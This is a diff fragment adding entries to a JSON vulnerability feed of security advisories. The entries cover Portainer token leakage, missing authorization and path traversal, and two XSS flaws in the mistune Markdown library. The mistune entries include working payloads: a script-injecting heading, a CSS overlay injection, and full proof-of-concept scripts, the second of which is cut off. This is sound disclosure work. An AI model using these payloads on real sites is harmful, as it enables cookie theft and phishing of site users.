vehicle.\n- Cluster resource access. Depending on the service account permissions Portainer holds on the cluster, the attacker can read or modify namespaced resources \u2014 including pods, secrets, config maps, and deployments.\n- Potential for lateral movement. Kubernetes secrets readable through this path may contain credentials for other services within the cluster or the broader infrastructure.\n\n## Timeline\n- 2026-02-16: Fix merged to develop.\n- 2026-02-25: 2.39.0 released with fix.\n- 2026-05-07: 2.33.8 released with backport fix.",
+      "first_seen": "2026-05-14T18:04:02.409904+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409904+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-mgq6-4x29-88r3",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-mgq6-4x29-88r3"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Portainer's Kubernetes middleware continues after token validation failure, bypassing endpoint authorization"
+    },
+    {
+      "canonical_id": "CVE-2026-44883",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-598"
+      ],
+      "description": "## Summary\nPortainer's authentication middleware accepts JWT bearer tokens passed as the `?token=<JWT>` URL query parameter on any authenticated API endpoint, in addition to the standard `Authorization: Bearer` header. URLs are recorded in reverse-proxy access logs, browser history, and HTTP `Referer` headers on outbound navigation, so any JWT passed this way can be harvested by anyone with access to those logs or by an external site the user subsequently visits. A leaked token grants the full privileges of the user it was issued to, until the token expires (default 8 hours, configurable).\n\nThe `?token=` parameter was used by Portainer's browser-based container attach, exec, and pod shell features, so any user with exec or attach rights on a container was exposed \u2014 not only administrators.\n\n## Severity\n**High**\n\nAttack complexity is High because exploitation depends on the attacker obtaining a leaked token from a log, referer, or shared URL. Once obtained, a leaked token grants the privileges of the user it was issued to; for administrator tokens this compromises confidentiality, integrity, and availability of Portainer itself and of every Docker/Kubernetes environment it manages \u2014 container exec and stack deployment make host-level compromise reachable, so subsequent-system impact is also High.\n\n## Affected Versions\nQuery-parameter token acceptance has existed since JWT authentication was introduced in Portainer.\n\nFixes are included in the following releases:\n\n| Branch              | First vulnerable | Fixed in   |\n|---------------------|------------------|------------|\n| 2.33.x (LTS)        | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS)        | 2.39.0           | **2.39.2** |\n| 2.40.x (STS)        | all prior        | **2.41.0** |\n\nPortainer releases prior to 2.33.0 are end-of-life and will not receive a fix. Users on EOL versions should upgrade to a supported LTS branch.\n\n## Workarounds\nAdministrators who cannot immediately upgrade can reduce exposure by:\n\n- **Stripping `?token=` at the reverse proxy.** A rewrite rule in nginx, Traefik, or equivalent that removes the `token` query parameter before the request reaches Portainer blocks the query-parameter auth path entirely. Container exec and interactive shells rely on the query-parameter token for WebSocket upgrade and will stop working until the patched release is deployed.\n- **Auditing existing logs.** Search reverse-proxy access logs and application logs for `?token=` or `&token=` occurrences and treat any captured JWT as compromised. Resetting the affected user's password invalidates their sessions; reducing the JWT session timeout in Portainer settings shortens the exposure window for tokens already issued.\n- **Administrator hygiene.** Do not share Portainer URLs that contain `?token=` in chat, email, or tickets, and avoid navigating to external sites from within the Portainer UI on unpatched instances \u2014 the `Referer` header will carry the token.\n\nNone of these replace the fix.\n\n## Affected Code\nPre-fix, `extractBearerToken` in `api/http/security/bouncer.go` read the JWT from the `token` query parameter before falling back to the `Authorization` header. The `query.Del(\"token\")` call scrubs the parameter from `r.URL.RawQuery` on the way through Portainer, but by that point the original URL has already been recorded by any upstream reverse proxy, access logger, or browser.\n\n```go\nfunc extractBearerToken(r *http.Request) (string, bool) {\n    query := r.URL.Query()\n    token := query.Get(\"token\")\n    if token != \"\" {\n        query.Del(\"token\")\n        r.URL.RawQuery = query.Encode()\n        return token, true\n    }\n\n    tokens, ok := r.Header[jwtTokenHeader]\n    if !ok || len(tokens) == 0 {\n        return \"\", false\n    }\n    // ...\n}\n```\n\nThe fix removes the query-parameter path entirely. Authenticated requests now carry the JWT via the `Authorization` header for API clients, or via the `portainer_api_key` HttpOnly cookie for the browser UI \u2014 cookies are sent automatically on same-origin WebSocket upgrade requests, so the browser-based container attach, exec, and pod shell features continue to work without exposing the token in the URL. The WebSocket handlers that previously documented `?token=` as a required query parameter have been updated to match.\n\n## Impact\n- **Token leakage to infrastructure.** Intermediate systems that observe the request URL \u2014 reverse proxies, load balancers, access logs, WAFs, and corporate network monitoring \u2014 capture the full JWT in plaintext.\n- **Token leakage via the browser.** URLs containing `?token=` are recorded in browser history and forwarded in the `Referer` header on any outbound navigation from the Portainer UI.\n- **Account takeover.** Anyone with access to a leaked JWT acts as the authenticated user for the remainder of the token's validity, without needing the password. If the leaked token belongs to an administrator, the attacker gains full API access including user management, container exec, and stack deployment.\n- **Reach beyond Portainer.** Container exec with an administrator JWT reaches the host filesystem of managed environments and can be used to execute commands on those hosts.\n\n## Timeline\n- 2026-03-06: Reported via GitHub Security Advisory by **scanpwn**.\n- 2026-04-14: Fix merged to `develop`.\n- 2026-04-29: 2.41.0 released.\n- 2026-05-07: 2.39.2-LTS and 2.33.8-LTS released.\n\n## Credit\n- **scanpwn** \u2014 identified and reported the query-parameter JWT acceptance and the resulting token-leakage vectors.",
+      "first_seen": "2026-05-14T18:04:02.409755+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409755+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-jvp4-q659-95mj",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/releases/tag/2.41.0",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-jvp4-q659-95mj"
+      ],
+      "severity": "high",
+      "source_count": 1,
+      "title": "Portainer: JWT accepted in URL query leaks tokens to logs and referers"
+    },
+    {
+      "canonical_id": "CVE-2026-44884",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-862"
+      ],
+      "description": "## Summary\nA missing authorization vulnerability in the Custom Template file endpoint (`GET /api/custom_templates/{id}/file`) allows any authenticated user to read the file content of any custom template by enumerating sequential integer IDs, bypassing Resource Control access restrictions. Template files may contain environment-specific values such as connection strings, API tokens, or registry credentials that administrators would not expect standard users to read.\n\n## Severity\n\n**Medium**\n\n**CWE-862** \u2014 Missing Authorization\n\nExploitation requires an authenticated user account and at least one custom template to exist. Template files are returned verbatim and may contain embedded credentials.\n\n## Affected Versions\n\nThe vulnerability exists in every Portainer release since custom templates were introduced \u2014 the `customTemplateFile` handler has never performed an authorization check.\n\nFixes are included in the following releases:\n\n| Branch              | First vulnerable | Fixed in   |\n|---------------------|------------------|------------|\n| 2.33.x (LTS)        | 2.33.0           | **2.33.8** |\n| 2.39.x (LTS)        | 2.39.0           | **2.39.1** |\n\nPortainer 2.40.0 and later are not affected \u2014 the fix was already on `develop` when the 2.40.x STS line branched. Portainer LTS branches receive fixes for 6 months plus a 3-month overlap after the next LTS ships. All releases **prior to 2.33.0 are end-of-life** and will not receive a fix; users on EOL versions should upgrade to a supported release.\n\n## Workarounds\n\nThere is no runtime configuration that blocks the vulnerable endpoint directly. Administrators who cannot immediately upgrade can reduce exposure by:\n\n- **Avoiding storing secrets in custom templates** until the patched release is deployed. Move sensitive configuration values to Portainer environment variables or an external secret store.\n- **Reviewing existing custom templates** for embedded secrets. Assume any secret previously stored in a custom template on an unpatched instance has been exposed to every authenticated user and rotate accordingly.\n\nNeither replaces the fix.\n\n## Affected Code\nThe `customTemplateFile` handler in `api/http/handler/customtemplates/customtemplate_file.go` (lines 30-53) retrieves a custom template by its numeric ID and returns the file content without performing any authorization check.\n\nAll other custom template endpoints properly verify access:\n\n| Endpoint | Method | Authorization Check |\n|----------|--------|-------------------|\n| `/api/custom_templates/{id}` | GET (inspect) | `userCanEditTemplate()` + `UserCanAccessResource()` |\n| `/api/custom_templates/{id}` | PUT (update) | `userCanEditTemplate()` |\n| `/api/custom_templates/{id}` | DELETE | `userCanEditTemplate()` |\n| `/api/custom_templates` | GET (list) | `FilterAuthorizedCustomTemplates()` |\n| **`/api/custom_templates/{id}/file`** | **GET** | **None** |\n\n**Vulnerable code** (`customtemplate_file.go:30-53`):\n```go\nfunc (handler *Handler) customTemplateFile(w http.ResponseWriter, r *http.Request) *httperror.HandlerError {\n    customTemplateID, _ := request.RetrieveNumericRouteVariableValue(r, \"id\")\n    customTemplate, _ := handler.DataStore.CustomTemplate().Read(portainer.CustomTemplateID(customTemplateID))\n    // NO AUTHORIZATION CHECK\n    fileContent, _ := handler.FileService.GetFileContent(customTemplate.ProjectPath, entryPath)\n    return response.JSON(w, &fileResponse{FileContent: string(fileContent)})\n}\n```\n\n**Secure reference** (`customtemplate_inspect.go:50-75`):\n```go\ncanEdit := userCanEditTemplate(customTemplate, securityContext)\nhasAccess := authorization.UserCanAccessResource(securityContext.UserID, teamIDs, resourceControl)\nif !canEdit && !hasAccess {\n    return httperror.Forbidden(\"Access denied to resource\", httperrors.ErrResourceAccessDenied)\n}\n```\n\n## Impact\nAny authenticated user (including the lowest-privilege standard user) can read the file content of every custom template in the instance. Custom templates commonly contain Docker Compose configuration, which may include environment-specific secrets such as database connection strings, API tokens, or registry credentials.\n\n## Timeline\n\n- 2026-02-11: Reported via GitHub Security Advisory by **duddnr0615k**.\n- 2026-03-04: Fix merged to `develop` and cherry-picked to `release/2.39`.\n- 2026-03-19: 2.39.1 released with fix.\n- 2026-03-25: 2.40.0 released with fix already present from branch cut.\n- 2026-05-07: 2.33.8 released.\n\n## Credit\n\n- **duddnr0615k** \u2014 identified and reported the missing authorization check on the custom template file endpoint.",
+      "first_seen": "2026-05-14T18:04:02.409669+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409669+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-cqpq-2fgr-8mvc",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/releases/tag/2.39.2",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-cqpq-2fgr-8mvc"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Portainer missing authorization on custom template file endpoint, which exposes template content"
+    },
+    {
+      "canonical_id": "CVE-2026-44885",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-22"
+      ],
+      "description": "### Summary\nPortainer's backup restore feature accepts a `.tar.gz` archive and extracts it to a target directory on the server. The extraction function (`ExtractTarGz` in `api/archive/targz.go`) constructed output paths using `filepath.Clean(filepath.Join(outputDirPath, header.Name))`. This combination does not prevent directory traversal \u2014 a tar entry named `../../etc/cron.d/evil` resolves to a path outside the extraction root, so a crafted archive can write files to arbitrary locations on the server filesystem.\n\n## Severity\n\n**Medium**\n\n**CWE-22** \u2014 Improper Limitation of a Pathname to a Restricted Directory\n('Path Traversal')\n\nExploitation requires administrator access to Portainer's backup restore endpoint. An administrator who is deceived into restoring a malicious archive, or whose credentials are compromised, can use this path to write files outside the Portainer data directory.\n\n## Affected Versions\n\nThe vulnerability exists in every Portainer release prior to 2.39.0 \u2014 `ExtractTarGz` has used `filepath.Clean(filepath.Join())` since it was introduced.  The fix shipped with 2.39.0 (patched on `develop` before the 2.39 branch cut); 2.34.x\u20132.38.x STS releases are also affected but are end-of-life and will not receive a fix.\n\n| Branch       | First vulnerable | Fixed in   |\n|--------------|------------------|------------|\n| 2.33.x (LTS) | 2.33.0           | **2.33.8** |\n\nPortainer 2.39.0 and later are not affected \u2014 the fix was present from the initial 2.39.0 release. All releases prior to 2.33.0 are end-of-life and will not receive a fix; users on EOL versions should upgrade to a supported release.\n\n## Workarounds\n\nAdministrators who cannot immediately upgrade should:\n\n- **Only restore archives from trusted sources.** Do not restore archives received from untrusted parties or transmitted over unencrypted channels.\n- **Use backup encryption.** Portainer's optional backup encryption requires the correct passphrase to decrypt before extraction; an attacker without the passphrase cannot craft a valid encrypted archive.\n\nNeither of these replaces the fix.\n\n## Affected Code\n\n`ExtractTarGz` in `api/archive/targz.go` constructed output paths without safe containment:\n\n```go\n// api/archive/targz.go (pre-fix)\ncase tar.TypeReg:\n    p := filepath.Clean(filepath.Join(outputDirPath, header.Name))\n```\nfilepath.Join resolves ../ components lexically and filepath.Clean normalises the result, but neither verifies the final path remains inside outputDirPath. The fix replaces this with filesystem.JoinPaths, which forces all path components to be relative to the trusted root:\n\n```go\n// api/archive/targz.go (post-fix)\ncase tar.TypeReg:\n    p := filesystem.JoinPaths(outputDirPath, header.Name)\n```\n\n### Impact\n\n- Arbitrary file write at any path accessible to the Portainer process (typically root in containerised deployments), overriding filesystem boundaries of the data directory.\n- Potential host persistence by writing to cron directories, SSH authorised key files, or executable paths, depending on how the container is configured and what host paths are accessible.\n\nThe practical severity is reduced because exploitation requires administrative privileges within Portainer.\n\n## Timeline\n\n- 2026-02-16: Fix merged to develop ([#1875](https://github.com/portainer/portainer-suite/pull/1875)).\n- 2026-02-25: 2.39.0 released with fix.\n- 2026-05-07: 2.33.8 released with backport fix.\n\n### Credits\nReported by [Kolega](https://kolega.ai).",
+      "first_seen": "2026-05-14T18:04:02.410226+00:00",
+      "frameworks": [
+        "go"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.410226+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-m8fg-67j7-cx4v",
+        "https://github.com/portainer/portainer/commit/e02ae6b2fb69668d1cd7d07cb873dfcdd9cf1e42",
+        "https://github.com/portainer/portainer/releases/tag/2.33.8",
+        "https://github.com/portainer/portainer/security/advisories/GHSA-m8fg-67j7-cx4v"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Portainer has a path traversal in backup archive extraction that allows arbitrary file write"
+    },
+    {
+      "canonical_id": "CVE-2026-44898",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Summary\n`render_toc_ul()` builds a `<ul>` table-of-contents tree from a list of `(level, id, text)` tuples. Both the `id` value (used as `href=\"#<id>\"`) and the `text` value (used as the visible link label) are inserted into `<a>` tags via a plain Python format string \u2014 with no HTML escaping applied to either value.\n\nWhen heading IDs are derived from user-supplied heading text (the standard use-case for readable slug anchors), an attacker can craft a heading whose text breaks out of the `href=\"#...\"` attribute context, injecting arbitrary HTML tags including `<script>` blocks directly into the rendered TOC.\n\nThis vulnerability is closely related to H2 (unescaped `id=` in `heading()`): the same `heading_id` callback pattern that triggers H2 also populates the `toc_items` list that `render_toc_ul()` consumes, meaning both vulnerabilities fire simultaneously in a typical documentation setup.\n\n## Details\n**File:** `src/mistune/toc.py`\n\n```python\ndef render_toc_ul(toc):\n    ...\n    for level, k, text in toc:\n        # k   = heading id  (used verbatim as href fragment)\n        # text = heading text (used verbatim as link label)\n        item = '<a href=\"#{}\">{}</a>'.format(k, text)\n        # Neither k nor text is passed through escape() at any point\n```\n\nThe `k` and `text` values come directly from the `toc_items` list accumulated during parsing. If `k` contains `\"` or `>`, the `href` attribute is broken. If `text` contains `<`, raw tags are injected as the visible link content.\n\n## PoC\n**Step 1 \u2014 Establish the baseline (safe default IDs)**\n\nThe script creates a parser with `escape=True` and the default `add_toc_hook()` (no custom callback). The default hook assigns sequential numeric IDs that never contain user text:\n\n```python\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_src = \"# Introduction\\n\\n## Installation\\n\"\n_, state = md_safe.parse(bl_src)\nbl_out = render_toc_ul(state.env.get(\"toc_items\", []))\n```\n\nOutput \u2014 clean, safe TOC:\n```html\n<ul>\n<li><a href=\"#toc_1\">Introduction</a>\n<ul>\n<li><a href=\"#toc_2\">Installation</a></li>\n</ul>\n</li>\n</ul>\n```\n\n**Step 2 \u2014 Enable the vulnerable `heading_id` callback**\n\nRegister a callback that returns the raw heading text as the ID. This is the standard slug-based anchor pattern used by documentation generators:\n\n```python\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n```\n\n**Step 3 \u2014 Craft the exploit payload**\n\nConstruct a heading whose text terminates the `href=\"#...\"` attribute and injects a `<script>` block followed by a dangling `<a href=\"` to absorb the closing `\">` that `render_toc_ul` appends:\n\n```\n## x\"><script>alert(document.cookie)</script><a href=\"\n```\n\nWhen `raw_id` processes this heading, it returns the entire text as the ID: `x\"><script>alert(document.cookie)</script><a href=\"`.\n\n**Step 4 \u2014 Observe script injection in the TOC output**\n\n```python\nex_src = '## x\"><script>alert(document.cookie)</script><a href=\"\\n'\n_, state = md_vuln.parse(ex_src)\nex_out = render_toc_ul(state.env.get(\"toc_items\", []))\n```\n\n`render_toc_ul()` formats the malicious ID directly into the `<a href>`:\n\n```python\n'<a href=\"#{}\">{}</a>'.format(k, text)\n# becomes:\n'<a href=\"#x\"><script>alert(document.cookie)</script><a href=\"\">...<a/>'\n```\n\nActual output:\n```html\n<ul>\n<li><a href=\"#x\"><script>alert(document.cookie)</script><a href=\"\">x&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;a href=&quot;</a></li>\n</ul>\n```\n\nThe `<script>` block is live in the document. Note that the anchor *label* (`text`) is escaped correctly by mistune's inline renderer before it reaches `toc_items`, but `k` (the heading ID) is not escaped anywhere.\n\n### Script\n\nI have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.\n\n```python\n#!/usr/bin/env python3\n\"\"\"H4: render_toc_ul() puts raw heading ID into <a href> without escaping.\"\"\"\nimport os, html as h\nfrom mistune import create_markdown\nfrom mistune.toc import add_toc_hook, render_toc_ul\n\ndef raw_id(token, index):\n    return token.get(\"text\", \"\")\n\n# --- baseline ---\nmd_safe = create_markdown(escape=True)\nadd_toc_hook(md_safe)\n\nbl_file = \"baseline_h4.md\"\nbl_src  = \"# Introduction\\n\\n## Installation\\n\"\nwith open(os.path.join(os.getcwd(), bl_file), \"w\") as f:\n    f.write(bl_src)\n_, state = md_safe.parse(bl_src)\nbl_out = render_toc_ul(state.env.get(\"toc_items\", []))\n\nprint(f\"[{bl_file}]\\n{bl_src}\")\nprint(\"[toc output \u2014 safe]\")\nprint(bl_out)\n\n# --- exploit ---\nmd_vuln = create_markdown(escape=True)\nadd_toc_hook(md_vuln, heading_id=raw_id)\n\nex_file = \"exploit_h4.md\"\nex_src  = '## x\"><script>alert(document.cookie)</script><a href=\"\\n'\nwith open(os.path.join(os.getcwd(), ex_file), \"w\") as f:\n    f.write(ex_src)\n_, state = md_vuln.parse(ex_src)\nex_out = render_toc_ul(state.env.get(\"toc_items\", []))\n\nprint(f\"[{ex_file}]\\n{ex_src}\")\nprint(\"[toc output \u2014 script injected via href breakout]\")\nprint(ex_out)\n\n# --- HTML report ---\nCSS = \"\"\"\nbody{font-family:-apple-system,sans-serif;max-width:1200px;margin:40px auto;background:#f0f0f0;color:#111;padding:0 24px}\nh1{font-size:1.3em;border-bottom:3px solid #333;padding-bottom:8px;margin-bottom:4px}\np.desc{color:#555;font-size:.9em;margin-top:6px}\n.case{margin:24px 0;border-radius:8px;overflow:hidden;border:1px solid #ccc;box-shadow:0 1px 4px rgba(0,0,0,.1)}\n.case-header{padding:10px 16px;font-weight:bold;font-family:monospace;font-size:.85em}\n.baseline .case-header{background:#d1fae5;color:#065f46}\n.exploit  .case-header{background:#fee2e2;color:#7f1d1d}\n.panels{display:grid;grid-template-columns:1fr 1fr;background:#fff}\n.panel{padding:16px}\n.panel+.panel{border-left:1px solid #eee}\n.panel h3{margin:0 0 8px;font-size:.68em;color:#888;text-transform:uppercase;letter-spacing:.07em}\npre{margin:0;padding:10px;background:#f6f6f6;border:1px solid #e0e0e0;border-radius:4px;font-size:.78em;white-space:pre-wrap;word-break:break-all}\n.rlabel{font-size:.68em;color:#aaa;margin:10px 0 4px;font-family:monospace}\n.rendered{padding:12px;border:1px dashed #ccc;border-radius:4px;min-height:20px;background:#fff;font-size:.9em}\n\"\"\"\n\ndef case(kind, label, filename, src, out):\n    return f\"\"\"\n<div class=\"case {kind}\">\n  <div class=\"case-header\">{'BASELINE' if kind=='baseline' else 'EXPLOIT'} \u2014 {h.escape(label)}</div>\n  <div class=\"panels\">\n    <div class=\"panel\">\n      <h3>Input \u2014 {h.escape(filename)}</h3>\n      <pre>{h.escape(src)}</pre>\n    </div>\n    <div class=\"panel\">\n      <h3>TOC output \u2014 HTML source</h3>\n      <pre>{h.escape(out)}</pre>\n      <div class=\"rlabel\">\u2193 rendered in browser</div>\n      <div class=\"rendered\">{out}</div>\n    </div>\n  </div>\n</div>\"\"\"\n\npage = f\"\"\"<!DOCTYPE html><html lang=\"en\"><head><meta charset=\"UTF-8\">\n<title>H4 \u2014 TOC XSS</title><style>{CSS}</style></head><body>\n<h1>H4 \u2014 TOC render_toc_ul() XSS</h1>\n<p class=\"desc\">render_toc_ul() in toc.py uses '&lt;a href=\"#{{}}\"&gt;{{}}&lt;/a&gt;'.format(k, text) \u2014\nneither k (the heading ID) nor text is escaped before insertion.</p>\n{case(\"baseline\", \"Normal headings \u2192 sequential IDs \u2192 clean TOC links\", bl_file, bl_src, bl_out)}\n{case(\"exploit\",  \"Malicious heading ID breaks out of href='#...' \u2192 script injected\", ex_file, ex_src, ex_out)}\n</body></html>\"\"\"\n\nout_path = os.path.join(os.getcwd(), \"report_h4.html\")\nwith open(out_path, \"w\") as f:\n    f.write(page)\nprint(f\"\\n[report] {out_path}\")\n```\n\nExample usage:\n```bash\npython poc.py\n```\n\nOnce you run the script, open `report_h4.html` in the browser and observe the behaviour.\n\n## Impact\n| Dimension        | Assessment |\n|------------------|-----------|\n| **Confidentiality** | JavaScript execution; attacker can exfiltrate session cookies and any data accessible from the page's origin |\n| **Integrity**    | Arbitrary DOM manipulation, phishing form injection, forced redirects |\n| **Availability** | Page crash or freeze available as secondary effect |\n\n**Risk context:** TOC generation is a rendering step that often happens in a different template layer from the main body render, potentially reviewed separately and trusted implicitly. Vulnerabilities in TOC output are frequently overlooked in code review. Combined with H2, an attacker exploiting this via a single malicious heading simultaneously injects into both the heading element and the TOC anchor.",
+      "first_seen": "2026-05-14T18:04:02.409571+00:00",
+      "frameworks": [
+        "pip"
+      ],
+      "key_kind": "cve",
+      "languages": [],
+      "last_seen": "2026-05-14T18:04:02.409571+00:00",
+      "merged_sources": [
+        "ghsa"
+      ],
+      "proactive_only": false,
+      "raw_records_count": 1,
+      "references": [
+        "https://github.com/advisories/GHSA-6269-cqxg-mhhv",
+        "https://github.com/lepture/mistune/commit/04880a0",
+        "https://github.com/lepture/mistune/releases/tag/v3.2.1",
+        "https://github.com/lepture/mistune/security/advisories/GHSA-6269-cqxg-mhhv"
+      ],
+      "severity": "medium",
+      "source_count": 1,
+      "title": "Mistune TOC Anchor Injection XSS"
+    },
+    {
+      "canonical_id": "CVE-2026-44899",
+      "composite_confidence": 0.95,
+      "cwe": [
+        "CWE-79"
+      ],
+      "description": "## Summary\nThe Image directive plugin validates the `:width:` and `:height:` options with a regex compiled as `_num_re = re.compile(r\"^\\d+(?:\\.\\d*)?\")`. This pattern is applied via `re.match()` (which anchors only at the **start** of the string, not the end). Any value that begins with one or more digits passes validation, regardless of what follows.\n\nWhen the validated value is not a plain integer, `render_block_image()` inserts it directly into a `style=\"width:...;\"` or `style=\"height:...;\"` attribute. Because the value was accepted by the prefix-only regex, any CSS after the leading digits reaches the `style=` attribute verbatim and without escaping.\n\nAn attacker can therefore inject an arbitrary chain of CSS properties \u2014 including `position:fixed`, `background-color`, `z-index`, `outline`, and `opacity` \u2014 using nothing more than a single `:width:` option in a fenced image directive. The resulting element can visually cover the entire browser viewport, enabling full-page phishing overlays and UI redressing attacks.\n\n## Details\n**File:** `src/mistune/directives/image.py`\n\n```python\n_num_re = re.compile(r\"^\\d+(?:\\.\\d*)?\")   # no $ anchor \u2014 prefix match only\n\ndef _parse_attrs(options):\n    height = options.get(\"height\")\n    width  = options.get(\"width\")\n    if height and _num_re.match(height):   # passes if value STARTS with a digit\n        attrs[\"height\"] = height           # full value stored, not just digits\n    if width and _num_re.match(width):     # same \u2014 prefix-only check\n        attrs[\"width\"] = width\n```\n\nAnd in `render_block_image()`:\n\n```python\nif width:\n    if width.isdigit():\n        img += ' width=\"' + width + '\"'   # safe: integer \u2192 HTML attribute\n    else:\n        style += \"width:\" + width + \";\"   # UNSAFE: non-integer \u2192 raw style value\n```\n\nThe `isdigit()` branch correctly uses an HTML attribute for plain integers. The `else` branch assumes that anything that passed `_num_re.match()` is a safe CSS length like `100px` or `50%`. However, because the regex is prefix-only, `100vw;height:100vh;position:fixed;...` also passes, and the entire string lands in `style=` unmodified.\n\n\n## PoC\n**Step 1 \u2014 Establish the baseline (safe plain-integer dimensions)**\n\nThe script creates a parser with `escape=True`, `FencedDirective`, and the `Image` plugin. A safe image directive is rendered with integer `width` and `height`:\n\n```python\nmd = create_markdown(escape=True, plugins=[FencedDirective([Image()])])\n\nbl_src = (\n    \"```{image} photo.jpg\\n\"\n    \":width: 400\\n\"\n    \":height: 300\\n\"\n    \":alt: safe image\\n\"\n    \"```\\n\"\n)\nbl_out = str(md(bl_src))\n```\n\nExpected and actual output \u2014 clean `width=` and `height=` HTML attributes, no `style=`:\n```html\n<div class=\"block-image\"><img src=\"photo.jpg\" alt=\"safe image\" width=\"400\" height=\"300\" /></div>\n```\n\n**Step 2 \u2014 Understand why non-integer widths go into `style=`**\n\nWhen `width` is not a plain integer (e.g., `100px`), `width.isdigit()` returns `False`, so the render path falls through to `style += \"width:\" + width + \";\"`. This is the intended mechanism for CSS-unit dimensions. The flaw is that `_num_re.match()` lets far more than CSS units through.\n\n**Step 3 \u2014 Craft the exploit payload**\n\nProvide a `:width:` value that begins with a valid number (satisfying `_num_re.match()`) but appends an entire CSS attack chain after it:\n\n```\n:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n```\n\n- `100vw` \u2014 starts with `1`, passes `_num_re.match()`; also sets the width to full viewport width\n- `;height:100vh` \u2014 overrides height to full viewport height\n- `;position:fixed` \u2014 lifts element out of document flow, fixed to the browser viewport\n- `;top:0;left:0` \u2014 anchors overlay to the top-left corner\n- `;z-index:9999` \u2014 places it above all other page content\n- `;background-color:#e11d48` \u2014 fills the overlay with vivid crimson\n- `;outline:8px solid #facc15` \u2014 adds a bright yellow border\n- `;color:#fff;opacity:.93` \u2014 styles the alt-text label in white with near-full opacity\n\nFull exploit markdown:\n```\n```{image} x.jpg\n:width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\n:alt: \u26a0 CSS INJECTED \u2014 click to dismiss \u26a0\n```\n```\n\n**Step 4 \u2014 Observe the injected `style=` in the output**\n\n```python\nex_src = (\n    \"```{image} x.jpg\\n\"\n    \":width: 100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;\"\n    \"background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93\\n\"\n    \":alt: \u26a0 CSS INJECTED \u2014 click to dismiss \u26a0\\n\"\n    \"```\\n\"\n)\nex_out = str(md(ex_src))\n```\n\nActual output:\n```html\n<div class=\"block-image\"><img src=\"x.jpg\" alt=\"\u26a0 CSS INJECTED \u2014 click to dismiss \u26a0\" style=\"width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;background-color:#e11d48;outline:8px solid #facc15;color:#fff;opacity:.93;\" /></div>\n```\n\nEvery injected CSS property is present in the `style=` attribute. When a browser renders this HTML, the `<img>` element:\n- expands to fill 100% of the viewport width and height\n- sits fixed at the top-left corner, scrolling with the viewport\n- is coloured crimson with a yellow outline\n- appears above all other page content\n\nThe result is a complete full-page phishing overlay generated from a single Markdown image directive.\n\n### Script \n\nI have built a script that you can use to verify this. It creates a HTML page showing the bypass so that you can see it render in the browser.\n\n```python\n#!/usr/bin/env python3\n\"\"\"H6: Image directive CSS injection \u2014 width/height use prefix-only re.match().\n\nExploit combines: position:fixed  +  background-color  +  outline colour\n\u2192 a full-viewport coloured overlay injected via a single :width: option.\n\"\"\"\nimport os, html as h\nfrom mistune import create_markdown\nfrom mistune.directives import FencedDirective\nfrom mistune.directives.image import Image\n\nmd = create_markdown(escape=True, plugins=[FencedDirective([Image()])])\n\n# --- baseline ---\nbl_file = \"baseline_h6.md\"\nbl_src  = (\n    \"```{image} photo.jpg\\n\"\n    \":width: 400\\n\"\n    \":height: 300\\n\"\n    \":alt: safe image\\n\"\n    \"```\\n\"\n)\nwith open(os.path.join(os.getcwd(), bl_file), \"w\") as f:\n    f.write(bl_src)\nbl_out = str(md(bl_src))\n\nprint(f\"[{bl_file}]\\n{bl_src}\")\nprint(\"[output \u2014 clean width/height attributes, no style injection]\")\nprint(bl_out)\n\n# --- exploit ---\n# _num_re.match() is prefix-only (no $ anchor), so anything after the leading\n# digits is accepted and written verbatim into style=\"width:<value>;\".\n# This single :width: value smuggles a full CSS attack chain:\n#   position:fixed  \u2192 overlay sits above the entire page\n#   top/left/width/height \u2192 covers 100 % of the viewport\n#   background-color:#e11d48 \u2192 vivid crimson fill\n#   outline:8px solid #facc15 \u2192 bright yellow border\n#   color:#fff \u2192 white alt-text 